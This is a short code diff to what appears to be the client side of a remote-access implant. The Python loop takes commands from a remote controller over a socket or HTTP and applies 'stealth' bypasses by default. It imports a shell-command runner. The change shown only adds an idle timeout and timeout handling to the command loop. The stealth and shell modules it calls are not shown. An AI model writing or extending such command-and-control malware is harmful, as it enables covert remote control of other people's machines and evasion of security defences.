@@ -1,15 +1,20 @@
+"""Client command dispatch loop."""
+import socket
+import time
+
 from client.commands import build_client_registry
 from client.modules.shell import run_command
 from client.modules.stealth import apply_all_bypasses
 
 
 def handle_session(sock_or_protocol, platform, encryption=False, tls=False,
-                   auto_bypass=True, http_mode=False):
+                   auto_bypass=True, http_mode=False, idle_timeout=300):
     if http_mode:
         protocol = sock_or_protocol
     else:
         from client.core.protocol import Protocol
         protocol = Protocol(sock_or_protocol) if not encryption else _build_encrypted(sock_or_protocol)
+        sock_or_protocol.settimeout(idle_timeout)
 
     from client.core.session_context import SessionContext
     ctx = SessionContext(sock=sock_or_protocol if not http_mode else None,
@@ -25,7 +30,10 @@ def handle_session(sock_or_protocol, platform, encryption=False, tls=False,
 
     try:
         while True:
-            command = protocol.recv()
+            try:
+                command = protocol.recv()
+            except socket.timeout:
+                continue
             if command is None:
                 continue
             if isinstance(command, dict):
